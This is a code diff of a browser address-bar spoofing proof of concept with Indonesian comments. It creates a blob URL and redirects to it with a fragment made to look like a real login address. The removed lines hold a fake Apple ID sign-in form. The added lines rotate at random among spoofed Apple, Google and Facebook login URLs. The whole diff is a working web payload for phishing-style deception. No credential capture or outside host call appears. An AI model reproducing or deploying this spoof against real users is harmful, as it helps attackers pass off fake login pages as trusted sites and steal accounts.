@@ -1,24 +1,15 @@
 <script>
-// Simple version - seperti original Renwa
-payload = 'x#https://www.account.apple.com';
+// Pilih target spoofing
+targets = [
+    'x#https://www.account.apple.com',
+    'x#https://accounts.google.com', 
+    'x#https://facebook.com/login'
+];
 
-// Create blob dengan fake login page
-fakePage = `
-<html>
-<body style="font-family: Arial; padding: 40px; text-align: center;">
-    <h1>🍎 Apple ID</h1>
-    <form onsubmit="alert('Login attempted')">
-        <input type="email" placeholder="Apple ID"><br><br>
-        <input type="password" placeholder="Password"><br><br>
-        <button>Sign In</button>
-    </form>
-</body>
-</html>
-`;
+// Buat blob content
+content = `<html><body><h1>Login Page</h1><p>Address bar spoofed</p></body></html>`;
+blob = new Blob([content], {type: 'text/html'});
 
-blob = new Blob([fakePage], { type: 'text/html' });
-url = URL.createObjectURL(blob);
-
-// Redirect ke blob URL dengan payload
-location = url + '#?' + payload;
+// Redirect dengan random target
+location = URL.createObjectURL(blob) + '#?' + targets[Math.floor(Math.random() * targets.length)];
 </script>
